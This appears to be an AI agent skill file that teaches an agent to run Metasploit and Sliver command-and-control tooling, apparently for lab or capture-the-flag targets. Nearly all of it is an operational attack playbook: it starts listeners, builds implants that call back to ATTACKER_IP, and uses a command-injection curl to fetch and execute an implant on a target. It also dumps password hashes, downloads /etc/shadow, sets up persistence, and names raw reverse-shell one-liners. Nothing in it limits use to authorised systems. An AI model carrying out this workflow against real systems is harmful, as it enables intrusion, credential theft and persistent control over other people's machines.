---
name: c2
description: "C2 operator skill for pi-metasploit and pi-sliver extensions. Covers when and how to use each C2 framework, payload generation, listener management, session interaction, beacon handling, and post-exploitation workflows. Use this skill whenever the task involves Metasploit or Sliver tooling."
license: private
metadata:
  category: security
  scope: c2
---

# C2 Operator Toolkit — pi-metasploit & pi-sliver

## ⚠️ Critical: No raw reverse shells

**Never use `bash -i >& /dev/tcp/...`, `nc -e /bin/bash`, `socat exec:...`, or any raw TCP reverse shell.** These do not work in the agentic Pi harness — the tool call will block waiting for an interactive TTY that never comes, and you lose the session.

**Always use compiled C2 implants instead.** The two options:

| Method | Tool | When to use |
|---|---|---|
| **Sliver implant** (preferred) | `sliver_implant_generate` | You have RCE and can upload+execute a binary |
| **MSF meterpreter payload** | `msf_generate_payload` | You need MSF post modules (hashdump, mimikatz) or a specific MSF exploit auto-drops it |

Both produce compiled ELF/EXE binaries that call back to a proper C2 handler with structured output — no TTY required.

---

## Decision framework

```
Do you have RCE (can run commands on target)?
├── YES → Can you upload and execute a binary?
│   ├── YES → Drop a Sliver implant (primary path)
│   └── NO  → Can you still curl/wget from target?
│       ├── YES → Serve a Sliver implant via HTTP staging server
│       └── NO  → Use MSF meterpreter payload (if target has specific CVE)
└── NO → Use MSF to find and run an exploit
    └── Exploit succeeded → immediately drop Sliver implant for persistence
```

### When to use Metasploit
- **Exploiting a known CVE** — `msf_run_exploit` with a specific module
- **Running auxiliary scanners** — `msf_search_auxiliary` with "scanner" (smb_version, http_login, etc.)
- **Checking vulnerability** — `msf_check` before exploiting
- **Post-exploitation modules** — hashdump, mimikatz, privilege escalation (only via meterpreter sessions)
- **Console commands** — `msf_console` for db_nmap, workspace management, setg

### When to use Sliver
- **You have any form of RCE** — always prefer dropping a Sliver implant
- **Persistent C2** — compiled implants with mTLS/HTTP/DNS C2
- **File operations** — ls, cat, upload, download, screenshot
- **Process reconnaissance** — ps, ifconfig, netstat
- **Multiple C2 channels** — mTLS for primary, HTTP for fallback, DNS for stealth

### When to combine
- MSF exploit → meterpreter session → upload Sliver implant → switch to Sliver for everything
- Sliver for recon/file ops → MSF for specific post-exploitation modules that need meterpreter

---

## Primary exploitation flow: Sliver implant drop

**This is the default path. Use it whenever you have RCE.**

### Step 1: Start Sliver listener

```
sliver_listener_mtls(host="0.0.0.0", port=4443)
# Or HTTP if mTLS is blocked:
sliver_listener_http(domain="", host="0.0.0.0", port=8080)
```

### Step 2: Generate implant

```
sliver_implant_generate(
  name="op-implant",
  os="linux",                    # or "windows", "darwin"
  arch="amd64",
  format="EXECUTABLE",
  c2_url="mtls://ATTACKER_IP:4443",
  is_beacon=true,                # beacons are more reliable in agentic workflows
  beacon_interval_seconds=10,
  beacon_jitter_seconds=5
)
# → Saved to /tmp/pi-sliver/<IMPLANT_NAME>
```

### Step 3: Stage and deploy via RCE

```bash
# Serve the implant from the attacker box (via bash tool):
python3 -m http.server 8888 --directory /tmp/pi-sliver &

# Trigger download + execution via the RCE vector (via bash tool):
# Example for command injection:
curl -sk https://target/api/endpoint -d '{"cmd":"curl http://ATTACKER_IP:8888/IMPLANT_NAME -o /tmp/i && chmod +x /tmp/i && nohup /tmp/i &"}'
```

### Step 4: Wait for callback and interact

```
sliver_beacons    → find the beacon UUID
sliver_exec(target_type="beacon", target_id="<uuid>", exe="/usr/bin/whoami")
sliver_cat(target_type="beacon", target_id="<uuid>", path="/home/user/user.txt")
```

### C2 URL schemes

| Scheme | Transport | Notes |
|---|---|---|
| `mtls://host:port` | Mutual TLS | Default, encrypted, most reliable |
| `http://host:port` | HTTP | Good fallback if mTLS blocked |
| `https://host:port` | HTTPS | With ACME for valid certs |
| `dns://domain` | DNS | Stealthy, needs domain |
| `wg://host:port` | WireGuard | Encrypted tunnel |

---

## pi-metasploit Quick Reference

### Pre-flight checks

```
msf_status        → version, module counts, sessions, jobs
msf_version       → just the version info
```

### Reconnaissance

```
msf_search_exploits(search="smb")       → find exploit modules
msf_search_auxiliary(search="scanner")  → find scanner modules
msf_search_payloads(search="meterpreter/reverse_tcp") → find payloads
msf_module_info(module_type="exploit", module_name="multi/handler") → details + options
```

### Exploitation with meterpreter

**Only use this path when you specifically need MSF post-exploitation modules.**

```bash
# 1. Start a handler FIRST
msf_start_listener(
  payload="linux/x64/meterpreter/reverse_tcp",
  lhost="ATTACKER_IP",
  lport=4444
)

# 2. Generate payload
msf_generate_payload(
  payload_type="linux/x64/meterpreter/reverse_tcp",
  format="elf",
  filename="shell.elf",
  options={ LHOST: "ATTACKER_IP", LPORT: "4444" }
)
# → Saved to /tmp/pi-metasploit/shell.elf

# 3. Serve + trigger via bash (same staging pattern as Sliver)
# 4. Check sessions and interact
msf_sessions
msf_session_command(session_id=1, command="sysinfo")

# 5. IMPORTANT: After getting meterpreter, deploy a Sliver implant for persistence
#    Don't rely on meterpreter for file operations — Sliver is more reliable.

# 6. Cleanup when done
msf_session_stop(session_id=1)
msf_job_stop(job_id=0)
```

### Run an exploit module directly

```
msf_run_exploit(
  module_name="unix/ftp/vsftpd_234_backdoor",
  options={ RHOSTS: "10.10.10.5" },
  payload="cmd/unix/reverse"
)
```

### Console access

```
msf_console(command="db_nmap -sV 10.10.10.5", timeout=60)
msf_console(command="setg LHOST 10.10.14.175")
```

### Post-exploitation (meterpreter only)

```
msf_run_post(module_name="linux/gather/hashdump", session_id=1)
msf_session_command(session_id=1, command="sysinfo")
msf_session_command(session_id=1, command="getuid")
```

### Important notes
- Always set `MSF_PASSWORD` and `MSF_SSL=false` (if using `-S` flag on msfrpcd)
- `msf_start_listener` sets `ExitOnSession: false` automatically (handler survives)
- `msf_generate_payload` auto-saves to `MSF_DOWNLOAD_DIR` (default: `$TMPDIR/pi-metasploit`)
- `msf_session_command` works for both shell and meterpreter sessions (auto-detects type)

---

## pi-sliver Quick Reference

### Pre-flight checks

```
sliver_status     → server version, session/beacon/job counts, operator info
sliver_version    → just the version
sliver_sessions   → list interactive sessions
sliver_beacons    → list async beacons
sliver_jobs       → list active listeners
sliver_operators  → who's connected
```

### Session vs Beacon interaction

Both use the same tools — just change `target_type` and `target_id`:

| Parameter | Session | Beacon |
|---|---|---|
| `target_type` | `"session"` | `"beacon"` |
| `target_id` | Session UUID | Beacon UUID |
| Response | Immediate | Queued — waits for checkin |

### File operations

```
sliver_cat(target, path="/etc/hostname")            → read small text files inline
sliver_download(target, remote_path="/etc/shadow")   → download to pi-sliver dir
sliver_upload(target, local_path="/tmp/tool", remote_path="/tmp/tool")
sliver_ls(target, path="/home")
sliver_pwd(target)
sliver_cd(target, path="/tmp")
sliver_mkdir(target, path="/tmp/loot")
sliver_rm(target, path="/tmp/implant")
```

### Reconnaissance on implant

```
sliver_ps(target)                → process list
sliver_ifconfig(target)          → network interfaces
sliver_netstat(target)           → active connections (may timeout on beacons)
sliver_screenshot(target)        → capture screen (needs GUI on target)
```

### Process control

```
sliver_exec(target, exe="/usr/bin/kill", args=["-9", "1234"])
sliver_terminate(target, pid=1234)
```

### Implant management

```
sliver_implants                  → list all built implants
sliver_implant_regenerate(name="FRIENDLY_TENEMENT")  → re-download a build
sliver_implant_delete(name="old-implant")             → remove from server cache
```

### Listener management

```
sliver_listener_mtls(host="0.0.0.0", port=4443)
sliver_listener_http(domain="c2.example.com", host="0.0.0.0", port=8080)
sliver_listener_https(domain="c2.example.com", host="0.0.0.0", port=443, acme=true)
sliver_listener_dns(domains=["c2.example.com"], host="0.0.0.0", port=53)
sliver_listener_wg(host="0.0.0.0", port=13337, tun_ip="10.0.0.1", n_port=8888, key_port=9999)
sliver_job_kill(job_id=3)        → stop a listener
```

---

## Beacon handling best practices

Beacons are asynchronous — they check in on an interval (e.g. every 10s ± jitter). This means:

1. **Tool calls block until the beacon responds**. A `sliver_exec` may take 10-60s.
2. **Heavy operations may timeout**. Netstat, ps with full_info, and downloads can be slow.
3. **Workarounds for slow beacons**:
   - Use `sliver_exec` with bash one-liners instead of native tools for heavy ops:
     ```
     sliver_exec(target, exe="/bin/bash", args=["-c", "netstat -tlnp"])
     ```
   - Generate an interactive session implant (not beacon) for targets that need heavy post-exploitation
4. **The beacon interval matters**. Use shorter intervals (5-10s) for active work, longer (60-300s) for persistence.

---

## Full exploitation example: RCE on a Linux target

```
# 1. Confirm RCE via bash (curl to vulnerable endpoint)

# 2. Start Sliver listener
sliver_listener_mtls(host="0.0.0.0", port=4443)

# 3. Generate Sliver implant
sliver_implant_generate(
  name="op-implant", os="linux", arch="amd64",
  c2_url="mtls://ATTACKER_IP:4443",
  is_beacon=true, beacon_interval_seconds=10
)

# 4. Stage + deploy (via bash)
#    - Serve: python3 -m http.server 8888 --directory /tmp/pi-sliver &
#    - Trigger: curl the RCE endpoint to download and execute the implant

# 5. Interact via Sliver
sliver_beacons
sliver_exec(target_type="beacon", target_id="<uuid>", exe="/usr/bin/whoami")
sliver_cat(target_type="beacon", target_id="<uuid>", path="/home/user/user.txt")

# 6. If you need MSF post modules, also drop a meterpreter:
msf_start_listener(payload="linux/x64/meterpreter/reverse_tcp", lhost="ATTACKER_IP", lport=4444)
msf_generate_payload(payload_type="linux/x64/meterpreter/reverse_tcp", format="elf", ...)
# Upload via Sliver:
sliver_upload(target, local_path="/tmp/pi-metasploit/payload.elf", remote_path="/tmp/m")
sliver_exec(target, exe="/bin/bash", args=["-c", "chmod +x /tmp/m && /tmp/m"])
msf_sessions  → verify meterpreter session

# 7. Cleanup when done
sliver_job_kill(job_id=<id>)
msf_session_stop(session_id=<id>)
msf_job_stop(job_id=<id>)
```
